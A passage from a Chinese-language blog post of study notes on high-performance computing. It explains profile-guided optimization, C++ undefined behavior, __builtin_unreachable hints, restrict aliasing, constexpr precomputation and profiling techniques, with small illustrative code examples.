<code>.gcda</code> 文件，这些文件包含了测试运行期间的 profiling
数据。</p>
<p><strong>步骤 2：基于 Profiling 数据优化编译</strong></p>
<p>在第二次编译时，使用 <code>-fprofile-use</code>
标志，这样编译器就能使用第一次运行中收集到的 profiling
数据来进行优化：</p>
<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line">g++ -fprofile-use [其他编译选项] source.cc -o binary</span><br></pre></td></tr></table></figure></div>
<p>这时，编译器能够利用收集到的信息做出更加精准的优化。PGO
可以显著提升程序的执行效率，尤其是在大型代码库中，通常可以带来 10-20%
的性能提升。由于这种优化是基于实际数据的，它能比传统的静态优化方法更有效。对于性能至关重要的项目，PGO
是一个常见的优化手段。</p>
<h4 id="契约式编程">契约式编程</h4>
<p>在 Java 和 Rust
这样的“安全”语言中，通常对每个可能的操作和输入都有明确的行为定义。有些细节（如哈希表的键顺序或
<code>std::vector</code>
的增长因子）可能会因实现不同而有所不同，但这些通常只是为了性能优化而留给实现的细节。</p>
<p>相比之下，C 和 C++ 的 <strong>未定义行为（Undefined Behavior,
UB）</strong>
概念则要极端得多。在这些语言中，某些操作不会在编译或运行时产生错误，但在标准中它们是不被允许的。这意味着程序员和编译器之间有一种契约：<strong>如果代码触发了未定义行为，编译器可以做任何事情</strong>，包括使显示器爆炸或格式化硬盘（虽然实际不会发生）。编译器工程师不会故意制造这些后果，而是利用未定义行为来消除边界情况（corner
cases），从而进行更激进的优化。</p>
<p>未定义行为的主要原因可以分为 <strong>两大类</strong>：</p>
<p>这些错误几乎总是程序员的无心之失，例如：</p>
<ol type="1">
<li><strong>明显的程序错误</strong></li>
</ol>
<ul>
<li><strong>除零</strong></li>
<li><strong>解引用空指针</strong></li>
<li><strong>访问未初始化的内存</strong></li>
</ul>
<p>与其让这些操作返回一个固定的回退值（如
0），不如让程序在测试时崩溃或表现出不可预测的行为，以便尽早发现错误。</p>
<ol start="2" type="1">
<li><strong>平台相关的行为</strong></li>
</ol>
<p>有些操作在不同的 CPU 架构上表现不同。例如：</p>
<ul>
<li><p><strong>整数左移超出位宽</strong></p>
<div class="highlight-container" data-rel="Cpp"><figure class="iseeu highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> x = <span class="number">1</span> &lt;&lt; <span class="number">32</span>;  <span class="comment">// UB</span></span><br></pre></td></tr></table></figure></div>
<p>这个操作在 x86 和 ARM 上可能会产生不同的结果。如果 C++
标准指定某种行为，那就意味着某些架构必须额外做一次检查，影响性能。因此，<strong>C++
直接规定它是 UB，避免额外的运行时开销。</strong></p></li>
</ul>
<p><strong>负数的右移</strong></p>
<div class="highlight-container" data-rel="Cpp"><figure class="iseeu highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> x = <span class="number">-42</span>;</span><br><span class="line">x &gt;&gt;= <span class="number">1</span>;</span><br></pre></td></tr></table></figure></div>
<p>在某些架构上，右移负数会补 1（算术右移），在其他架构上可能会补
0（逻辑右移）。C++ 允许这种行为由实现决定，而不是设为 UB，因此它是
<strong>实现定义（implementation-defined）</strong>
而不是未定义行为。</p>
<p>保留未定义行为有时候能够帮助编译器优化，比如实际在c++中，有符号整型（<strong>signed
int</strong>）的溢出就是一个<strong>UB</strong>，但无符号整型（<strong>unsigned
int</strong>）的溢出是被允许的，也就是说其实如果x为有符号整型，那么<code>(x + 1) &gt; x</code>这个条件就<strong>恒为true</strong>，体现在编译器的处理过程上，他可能会直接优化整个分支。比如有如下代码：</p>
<div class="highlight-container" data-rel="Cpp"><figure class="iseeu highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">foo</span><span class="params">(<span class="type">int</span> x)</span> </span>{</span><br><span class="line">    <span class="keyword">if</span> (x + <span class="number">1</span> &lt; x) {</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"Overflow happened!\n"</span>);</span><br><span class="line">    }</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>{</span><br><span class="line">    <span class="built_in">foo</span>(<span class="number">0x7fffffff</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">}</span><br></pre></td></tr></table></figure></div>
<p>我们可能认为程序最后会打印<code>"Overflow happened!"</code>，但实际上我们用g++编译后拿IDA查看对应的代码，就会发现整个<strong>foo</strong>函数的分支就被优化掉了。而如果foo参数类型为<strong>unsigned
int</strong>，编译器就会如我们所想，编译出实现对应分支的汇编。</p>
<img lazyload="" src="/images/loading.svg" data-src="/blog/2025/03/15/Algorithmica-HPC%E7%A0%94%E8%AF%BB%E8%AE%B0%E5%BD%952/image-20250312234659884.png" class="">
<p><strong>去除边界情况</strong></p>
<p>"安全“的编程模式经常包括大量的边界检测，但这<strong>不一定会带来性能损失</strong>，因为编译器可能在编译阶段就能保证数据是在边界范围内的，由此可以直接安全的优化掉边界检测。</p>
<p>我们也可以手动使用<code>__builtin_unreachable</code>
来消除边界检查，比如我们有如下代码：</p>
<div class="highlight-container" data-rel="Cpp"><figure class="iseeu highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;vector&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;cassert&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">assume</span><span class="params">(<span class="type">bool</span> pred)</span> </span>{</span><br><span class="line">    <span class="keyword">if</span> (!pred)</span><br><span class="line">        __builtin_unreachable();  <span class="comment">// 告诉编译器这里不可能执行</span></span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">safe_at</span><span class="params">(std::vector&lt;<span class="type">int</span>&gt;&amp; v, <span class="type">size_t</span> k)</span> </span>{</span><br><span class="line">    <span class="built_in">assume</span>(k &lt; v.<span class="built_in">size</span>());  <span class="comment">// 假设 k 一定合法</span></span><br><span class="line">    <span class="keyword">return</span> v.<span class="built_in">at</span>(k);        <span class="comment">// 编译器现在可能会优化掉边界检查</span></span><br><span class="line">}</span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">test</span><span class="params">(std::vector&lt;<span class="type">int</span>&gt;&amp; v)</span> </span>{</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">size_t</span> i = <span class="number">0</span>; i &lt; v.<span class="built_in">size</span>()<span class="number">+1</span>; i++) {</span><br><span class="line">        std::cout &lt;&lt; <span class="built_in">safe_at</span>(v,i) &lt;&lt; std::endl;</span><br><span class="line">    }</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>{</span><br><span class="line">    std::vector&lt;<span class="type">int</span>&gt; v = {<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">5</span>};</span><br><span class="line">    <span class="built_in">test</span>(v);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">}</span><br></pre></td></tr></table></figure></div>
<p>这里我把循环次数设置为了<code>v.size()+1</code>，也就是刚好越界，之后我们进行编译测试一下会发现，当开启<strong>O2及以上</strong>优化时，编译器就会根据我们的提示，优化掉vector的at中的边界检测了。</p>
<img lazyload="" src="/images/loading.svg" data-src="/blog/2025/03/15/Algorithmica-HPC%E7%A0%94%E8%AF%BB%E8%AE%B0%E5%BD%952/image-20250313114341492.png" class="">
<p>我们还可以<strong>结合 <code>assert()</code> 进行 Debug</strong></p>
<div class="highlight-container" data-rel="Cpp"><figure class="iseeu highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;vector&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;cassert&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">assume</span><span class="params">(<span class="type">bool</span> pred)</span> </span>{</span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> DEBUG</span></span><br><span class="line">    <span class="built_in">assert</span>(pred);  <span class="comment">// Debug 模式下检查假设</span></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">    <span class="keyword">if</span> (!pred)</span><br><span class="line">        __builtin_unreachable();  <span class="comment">// Release 模式下优化边界检查</span></span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">safe_at</span><span class="params">(std::vector&lt;<span class="type">int</span>&gt;&amp; v, <span class="type">size_t</span> k)</span> </span>{</span><br><span class="line">    <span class="built_in">assume</span>(k &lt; v.<span class="built_in">size</span>());</span><br><span class="line">    <span class="keyword">return</span> v[k];  <span class="comment">// 现在可以使用 `operator[]` 而不会触发未定义行为</span></span><br><span class="line">}</span><br></pre></td></tr></table></figure></div>
<ul>
<li>Debug 版本：<code>assert(k &lt; v.size());</code>
可以在运行时捕捉错误。</li>
<li>Release 版本：编译器会移除
<code>assume()</code>，并优化掉不必要的边界检查。</li>
</ul>
<p>在进行算术运算时，我们尤其要关注边界条件。而其中浮点数的优化比较简单，我们只用加入<code>-ffast-math</code>编译选项即可。</p>
<p>在默认情况下，编译器 <strong>必须</strong> 严格遵守 <strong>IEEE 754
浮点运算标准</strong>，例如：</p>
<ul>
<li>保证 <strong>运算的顺序</strong> 不能随意改变</li>
<li>处理 <strong>NaN</strong>（非数 <code>Not a Number</code>）和
<strong>无穷大</strong></li>
<li>保证 <strong>精度</strong> 及 <strong>舍入模式</strong></li>
</ul>
<p>但是，这种严格遵守会 <strong>阻碍优化</strong>。使用
<code>-ffast-math</code> 选项后，编译器可以 <strong>忽略一些 IEEE 754
规则</strong>，以换取更快的执行速度。</p>
<p>然后我们考虑一下整数的情况，首先是无符号整型，比如有以下代码。</p>
<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">unsigned</span> <span class="title function_">div_unsigned</span><span class="params">(<span class="type">unsigned</span> x)</span> {</span><br><span class="line">    <span class="keyword">return</span> x / <span class="number">2</span>;</span><br><span class="line">}</span><br></pre></td></tr></table></figure></div>
<p>我们知道除法对应的指令开销是很大的，一种非常常用的优化就是改为移位运算<code>x &gt;&gt; 1</code>。也就是<code>shr eax</code>。</p>
<p>但如果换成有符号整型，情况就有一点不同了。</p>
<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">div_signed</span><span class="params">(<span class="type">int</span> x)</span> {</span><br><span class="line">    <span class="keyword">return</span> x / <span class="number">2</span>;</span><br><span class="line">}</span><br></pre></td></tr></table></figure></div>
<p>如果x是负数，那么无论是算术右移位还是逻辑右移位，都会得到错误的结果。所以为了考虑到所有情况，需要用以下的汇编技巧实现：</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">mov  ebx, eax</span><br><span class="line">shr  ebx, 31    ; extract the sign bit</span><br><span class="line">add  eax, ebx   ; add 1 to the value if it is negative to ensure rounding towards zero</span><br><span class="line">sar  eax        ; this one shifts in sign bits</span><br></pre></td></tr></table></figure></div>
<p>这样的技巧比起简单的<code>shr eax</code>开销大了不少，效率只有原来的1/4，所以我们有时候如果<strong>认定x为正数</strong>，就可以用之前提到的<strong>assume</strong>方式来提示编译器优化掉边界条件的处理。</p>
<p>编译器在优化涉及<strong>内存读写</strong>的操作时通常比较困难，因为它们可能无法确定不同指针是否指向<strong>相同的内存区域</strong>。这会影响
<strong>指令重排、向量化（SIMD）、并行执行</strong> 等优化策略。</p>
<p>考虑如下代码：</p>
<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">add</span><span class="params">(<span class="type">int</span> *a, <span class="type">int</span> *b, <span class="type">int</span> n)</span> {</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; n; i++)</span><br><span class="line">        a[i] += b[i];</span><br><span class="line">}</span><br></pre></td></tr></table></figure></div>
<p><strong>编译器的视角</strong>：</p>
<ul>
<li>在每次 <code>a[i] += b[i]</code> 操作中，<code>a[i]</code> 依赖于
<code>b[i]</code> 的值。</li>
<li>由于 <code>a</code> 和 <code>b</code>
都是指针，编译器无法确定它们是否指向<strong>重叠的内存区域</strong>（aliasing）。</li>
<li>如果 <code>b == a - 1</code>（即 <code>b</code> 第二个元素指向
<code>a</code> ），那么 <code>b[i]</code> 可能是前一次循环
<code>a[i-1]</code>
的结果，导致数据<strong>依赖链</strong>，必须<strong>顺序执行</strong>。</li>
</ul>
<p><strong>C 语言中的 <code>restrict</code> 关键字</strong>
告诉编译器：</p>
<blockquote>
<p>这个指针是唯一访问该内存区域的方式，不会与其他指针发生 aliasing。</p>
</blockquote>
<p>优化后的代码：</p>
<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">add</span><span class="params">(<span class="type">int</span> * __restrict__ a, <span class="type">const</span> <span class="type">int</span> * __restrict__ b, <span class="type">int</span> n)</span> {</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; n; i++)</span><br><span class="line">        a[i] += b[i];</span><br><span class="line">}</span><br></pre></td></tr></table></figure></div>
<p><strong>这样做的好处</strong>：</p>
<ul>
<li><strong>保证 <code>a</code> 和 <code>b</code>
不会指向重叠内存</strong>，编译器可以自由优化。</li>
<li><strong>开启自动向量化（SIMD）</strong>，提升性能。</li>
<li><strong>增强代码可读性</strong>，明确表达数据的访问方式。</li>
</ul>
<h4 id="预计算">预计算</h4>
<p>在 C++ 编译优化中，<strong>预计算（Precomputation）</strong>
是一个关键技术。当编译器能够推断出某个变量的值<strong>仅依赖于编译时已知的数据</strong>，它可以直接在编译期计算这个值，并将其<strong>作为常量嵌入到机器代码中</strong>。</p>
<p>这可以显著提高运行时性能，但：</p>
<ul>
<li>这并非 C++ 标准的一部分，因此不同编译器可能会有不同的优化策略。</li>
<li>如果计算量过大，编译器可能会<strong>放弃预计算</strong>，转而保留运行时计算。</li>
</ul>
<p><strong>常量表达式（Constant Expressions）</strong></p>
<p>为了解决预计算的不确定性，C++ 允许显式指定某些函数为
<code>constexpr</code>，这样编译器<strong>必须</strong>在编译期计算它们的值（如果参数是常量）。</p>
<div class="highlight-container" data-rel="Cpp"><figure class="iseeu highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">constexpr</span> <span class="type">int</span> <span class="title">fibonacci</span><span class="params">(<span class="type">int</span> n)</span> </span>{</span><br><span class="line">    <span class="keyword">if</span> (n &lt;= <span class="number">2</span>)</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">fibonacci</span>(n - <span class="number">1</span>) + <span class="built_in">fibonacci</span>(n - <span class="number">2</span>);</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>{</span><br><span class="line">    cout &lt;&lt; <span class="built_in">fibonacci</span>(<span class="number">10</span>) &lt;&lt; endl;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">}</span><br></pre></td></tr></table></figure></div>
<p>在这个例子中<code>fibonacci(10)</code>
会在<strong>编译时计算</strong>并被替换成
<code>55</code>，而不会出现在运行时计算中。比如我们开O2优化后，就能看到已经不存在<strong>fibonacci</strong>函数，而是直接硬编码55输出了。</p>
<img lazyload="" src="/images/loading.svg" data-src="/blog/2025/03/15/Algorithmica-HPC%E7%A0%94%E8%AF%BB%E8%AE%B0%E5%BD%952/image-20250313133854264.png" class="">
<p><code>constexpr</code> 关键字带有一定限制：</p>
<ul>
<li>只能调用<strong>其他 <code>constexpr</code> 函数</strong>。</li>
<li><strong>不能进行动态内存分配</strong>（如 <code>new</code>）。</li>
<li>不能有<strong>运行时不可预测的行为</strong>（如读取文件、I/O
操作等）。</li>
</ul>
<p>但随着 C++
标准的演进，这些限制逐渐减少。由于<strong>递归版本效率低</strong>，C++17
允许 <code>constexpr</code> 函数使用
<strong>循环</strong>，提高计算效率：</p>
<div class="highlight-container" data-rel="Cpp"><figure class="iseeu highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">constexpr</span> <span class="type">int</span> <span class="title">fibonacci</span><span class="params">(<span class="type">int</span> n)</span> </span>{</span><br><span class="line">    <span class="type">int</span> a = <span class="number">1</span>, b = <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">while</span> (n--) {</span><br><span class="line">        <span class="type">int</span> c = a + b;</span><br><span class="line">        a = b;</span><br><span class="line">        b = c;</span><br><span class="line">    }</span><br><span class="line">    <span class="keyword">return</span> b;</span><br><span class="line">}</span><br></pre></td></tr></table></figure></div>
<p>这样 <code>fibonacci(100)</code> 之类的计算在编译期就能高效完成。</p>
<p>C++17 之后，可以使用 <code>constexpr</code>
构造<strong>静态查找表</strong>，这对于<strong>预计算平方根、对数等复杂数学运算</strong>特别有用。</p>
<div class="highlight-container" data-rel="Cpp"><figure class="iseeu highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="keyword">struct</span> <span class="title class_">Precalc</span> {</span><br><span class="line">    <span class="type">int</span> isqrt[<span class="number">1000</span>];</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">constexpr</span> <span class="title">Precalc</span><span class="params">()</span> : isqrt{</span>} {</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">1000</span>; i++)</span><br><span class="line">            isqrt[i] = <span class="built_in">int</span>(<span class="built_in">sqrt</span>(i));  <span class="comment">// 预计算整数平方根</span></span><br><span class="line">    }</span><br><span class="line">};</span><br><span class="line"></span><br><span class="line"><span class="keyword">constexpr</span> Precalc P;</span><br><span class="line"></span><br><span class="line"><span class="built_in">static_assert</span>(P.isqrt[<span class="number">42</span>] == <span class="number">6</span>);  <span class="comment">// 在编译期检查</span></span><br></pre></td></tr></table></figure></div>
<p>在这个例子中：</p>
<ul>
<li><code>Precalc</code> 结构体在<strong>编译期</strong>计算
<code>isqrt</code> 数组，并存储所有 <code>0~999</code>
的整数平方根。</li>
<li>这样，在运行时我们可以直接查表，而不需要重复计算
<code>sqrt()</code>。</li>
</ul>
<h3 id="五性能测试profiling">五、性能测试（Profiling）</h3>
<h4 id="概述-1">概述</h4>
<p><strong>仅仅看源代码或者汇编并不能精准找到性能瓶颈，必须使用合适的性能分析工具</strong>。分析方法主要分为三种：</p>
<ul>
<li><p><strong>Instrumentation（插桩分析）</strong></p></li>
<li><p><strong>Statistical Profiling（统计分析）</strong></p></li>
<li><p><strong>Program Simulation（程序模拟）</strong></p></li>
</ul>
<h4 id="插桩分析instrumentation">插桩分析（Instrumentation）</h4>
<h5 id="计时">计时</h5>
<p>用于测量代码执行时间，找到需要优化的部分。基本方法是使用
<code>clock()</code> 记录起始时间，执行函数后计算时间差。例如：</p>
<div class="highlight-container" data-rel="Cpp"><figure class="iseeu highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="type">clock_t</span> start = <span class="built_in">clock</span>();</span><br><span class="line"><span class="built_in">do_something</span>();</span><br><span class="line"><span class="type">float</span> seconds = <span class="built_in">float</span>(<span class="built_in">clock</span>() - start) / CLOCKS_PER_SEC;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"do_something() took %.4f seconds\n"</span>, seconds);</span><br></pre></td></tr></table></figure></div>
<p>由于 <code>clock()</code>
本身精度有限（微秒级），如果函数执行时间很短，单次测量会受到较大误差的影响。改进的方法是在循环中<strong>多次执行函数</strong>，然后计算平均时间：</p>
<div class="highlight-container" data-rel="Cpp"><figure class="iseeu highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="type">const</span> <span class="type">int</span> N = <span class="number">1e6</span>;</span><br><span class="line"><span class="type">clock_t</span> start = <span class="built_in">clock</span>();</span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; N; i++) </span><br><span class="line">    <span class="built_in">clock</span>(); <span class="comment">// 这里是测量 `clock()` 函数自身的开销</span></span><br><span class="line"><span class="type">float</span> duration = <span class="built_in">float</span>(<span class="built_in">clock</span>() - start) / CLOCKS_PER_SEC;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"%.2f ns per iteration\n"</span>, <span class="number">1e9</span> * duration / N);</span><br></pre></td></tr></table></figure></div>
<p>这种方法能够降低误差，但仍需注意缓存、编译器优化等影响。</p>
<h5 id="事件采样">事件采样</h5>
<p>用于统计特定算法的特征，例如：</p>
<ul>
<li>哈希函数：关注输入数据的平均长度；</li>
<li>二叉树：关注其高度和节点数；</li>
<li>排序算法：统计比较操作的次数。</li>
</ul>
<p><strong>基本方法</strong>是直接在代码中<strong>插入计数器</strong>：</p>
<div class="highlight-container" data-rel="Cpp"><figure class="iseeu highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="type">void</span> <span class="title">query</span><span class="params">()</span> </span>{</span><br><span class="line">    <span class="type">static</span> <span class="type">int</span> count = <span class="number">0</span>;</span><br><span class="line">    count++; <span class="comment">// 统计调用次数</span></span><br><span class="line">    <span class="comment">// 执行核心逻辑</span></span><br><span class="line">}</span><br></pre></td></tr></table></figure></div>
<p>缺点是如果调用次数过多，这会带来额外的性能开销。实际上看似这里的count++也增加不了多少花销，但如果统计数据的存储需要：</p>
<ul>
<li><strong>存入数组</strong> → 可能导致 <strong>CPU
缓存失效</strong>，因为 <code>count++</code>
会不断写入一个变量，而采样写入的次数更少；</li>
<li><strong>写入日志/文件</strong> → 频繁写入磁盘 I/O
代价极高，减少存储次数有利于性能；</li>
<li><strong>存入数据库</strong> →
频繁更新数据库可能导致事务开销增加。</li>
</ul>
<p>比如<code>query()</code> 被调用 <strong>10 亿次</strong>，那么
<code>stats</code> 可能占用 <strong>多个 GB 内存</strong>，并且 CPU
可能会因为缓存未命中导致性能下降。</p>
<div class="highlight-container" data-rel="Cpp"><figure class="iseeu highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 直接计数，每次都写入数组</span></span><br><span class="line"><span class="type">int</span> stats[<span class="number">1000000000</span>]; <span class="comment">// 占用大量内存</span></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">query</span><span class="params">()</span> </span>{</span><br><span class="line">    stats[query_id++] = some_value;</span><br><span class="line">}</span><br></pre></td></tr></table></figure></div>
<p>在这些情况下，<strong>随机采样可以降低存储和 I/O
开销</strong>。显著提高缓存命中率、减少 I/O 压力。</p>
<div class="highlight-container" data-rel="Cpp"><figure class="iseeu highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="type">void</span> <span class="title">query</span><span class="params">()</span> </span>{</span><br><span class="line">    <span class="keyword">if</span> (<span class="built_in">rand</span>() % <span class="number">100</span> == <span class="number">0</span>) {</span><br><span class="line">        sampled_stats[sample_id++] = some_value; <span class="comment">// 只存储 1% 的数据</span></span><br><span class="line">    }</span><br><span class="line">}</span><br></pre></td></tr></table></figure></div>
<p>不过上述随机采样实现方式也存在问题，如果我们要执行10亿次query，那就要调用10亿次rand函数。这里我们可以转用<strong>几何分布</strong>来进行随机抽样。<strong>几何分布的本质</strong>：它描述了<strong>成功事件（采样事件）发生之前的失败次数</strong>。假设我们仍然希望以
<strong>1% 的概率进行采样</strong>（即
<code>p = 0.01</code>），几何分布会<strong>直接生成下一个成功事件之前的失败次数</strong>。比如<code>geometric_distribution(0.01)</code>
可能返回 <strong>87</strong>，表示<strong>前 87 次都不会采样，第 88
次才会采样</strong>。</p>
<div class="highlight-container" data-rel="Cpp"><figure class="iseeu highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="type">void</span> <span class="title">query</span><span class="params">()</span> </span>{</span><br><span class="line">    <span class="type">static</span> <span class="type">int</span> next_sample = <span class="built_in">geometric_distribution</span>(sample_rate);</span><br><span class="line">    <span class="keyword">if</span> (--next_sample == <span class="number">0</span>) {  <span class="comment">// 只有当 next_sample 递减到 0 才采样</span></span><br><span class="line">        next_sample = <span class="built_in">geometric_distribution</span>(sample_rate);  <span class="comment">// 生成新的采样间隔</span></span><br><span class="line">        <span class="comment">// 更新统计数据</span></span><br><span class="line">    }</span><br><span class="line">    <span class="comment">// 执行核心逻辑</span></span><br><span class="line">}</span><br></pre></td></tr></table></figure></div>
<p>比如我们用如下代码进行实验，最后就会输出10个左右的不同抽样值：</p>
<div class="highlight-container" data-rel="Cpp"><figure class="iseeu highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;random&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;chrono&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"><span class="type">int</span> count = <span class="number">0</span>;</span><br><span class="line"><span class="type">double</span> sample_rate = <span class="number">0.01</span>;</span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">query</span><span class="params">()</span> </span>{</span><br><span class="line">    <span class="comment">// 用时间作为种子，避免伪随机</span></span><br><span class="line">    <span class="function"><span class="type">static</span> default_random_engine <span class="title">generator</span><span class="params">(chrono::steady_clock::now().time_since_epoch().count())</span></span>;</span><br><span class="line">    <span class="function"><span class="type">static</span> geometric_distribution&lt;<span class="type">int</span>&gt; <span class="title">dist</span><span class="params">(sample_rate)</span></span>;</span><br><span class="line">    <span class="type">static</span> <span class="type">int</span> next_sample = <span class="built_in">dist</span>(generator);</span><br><span class="line">    <span class="keyword">if</span> (--next_sample == <span class="number">0</span>) {  <span class="comment">// 只有当 next_sample 递减到 0 才采样</span></span><br><span class="line">        next_sample = <span class="built_in">dist</span>(generator);  <span class="comment">// 生成新的采样间隔</span></span><br><span class="line">        <span class="comment">// 更新统计数据</span></span><br><span class="line">        cout &lt;&lt; <span class="string">"count: "</span> &lt;&lt; count &lt;&lt; endl;</span><br><span class="line">    }</span><br><span class="line">    <span class="comment">// 执行核心逻辑</span></span><br><span class="line">    count++;</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>{</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">1000</span>; ++i) {</span><br><span class="line">        <span class="built_in">query</span>();</span><br><span class="line">    }</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">}</span><br></pre></td></tr></table></figure></div>
<h4 id="统计分析statistical-profiling">统计分析（Statistical
Profiling）</h4>
<p>在程序性能分析中，<strong>Instrumentation</strong>（插桩）方法虽然有效，但通常过于繁琐且容易带来额外开销。如果你需要分析程序中的多个小部分，或者需要较为细粒度的统计信息，Instrumentation的效果并不理想。<strong>Statistical
Profiling</strong>（统计分析）则提供了一个更轻量且高效的方法。</p>
<p><strong>Statistical Profiling的工作原理</strong></p>
<p>统计分析通过在随机时间间隔中暂停程序的执行，并查看程序计数器指向的位置来进行性能分析。每次暂停时，程序的<strong>指令指针</strong>（Instruction
Pointer，IP）会显示当前执行到的代码位置。通过在不同的函数块中进行暂停，可以得出一个大致的统计，反映出各个函数所消耗的执行时间。</p>
<h5 id="硬件事件与性能计数器"><strong>硬件事件与性能计数器</strong></h5>
<p><strong>硬件事件</strong>指的是与硬件行为相关的活动，如<strong>分支预测错误</strong>（branch
mispredict）、<strong>缓存未命中</strong>（cache
miss）等。这些事件在CPU上有对应的<strong>硬件性能计数器</strong>，这些计数器会记录特定硬件事件发生的次数。</p>
<ul>
<li><strong>硬件性能计数器</strong>：这些特殊的寄存器内置于微处理器中，用于存储某些硬件活动的发生次数。它们是非常轻量级的硬件组件，通常只有简单的二进制计数器和相应的激活信号。</li>
<li><strong>事件触发的计数</strong>：每个性能计数器与大量的硬件电路连接，可以配置为在某个硬件事件发生时递增。例如，若程序发生了分支预测错误，或者缓存未命中，计数器就会增加。</li>
<li><strong>事件多路复用</strong>：有时需要同时追踪多个硬件事件，可以通过<strong>多路复用</strong>技术，在不同的时间间隔内切换不同的计数器。虽然这种方法得到的统计是近似的，但它仍然能提供足够的信息用于性能分析。</li>
</ul>
<p>与插桩方法相比，统计分析方法更加轻量，不会在每个函数调用时引入额外的开销，避免了程序执行的显著干扰。通过增加采样频率可以提高分析的准确性，但过高的采样频率可能会引起性能下降，从而影响统计数据的真实性。因此，通常需要较长时间的运行来获得更精确的统计数据。</p>
<h5 id="分析工具">分析工具</h5>
<p>在linux系统上，主要使用 <strong>perf</strong>
进行分析，而在别的系统上，可以使用 <a class="link" href="https://software.intel.com/content/www/us/en/develop/tools/oneapi/components/vtune-profiler.html#gs.cuc0ks">VTune<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a>
实现类似功能。这里我在wsl环境下进行实验，也可以尝试用<code>sudo apt install linux-tools-common</code>进行安装，但是会一直显示内核环境不匹配。那我们可以去github下载源码手动编译。</p>
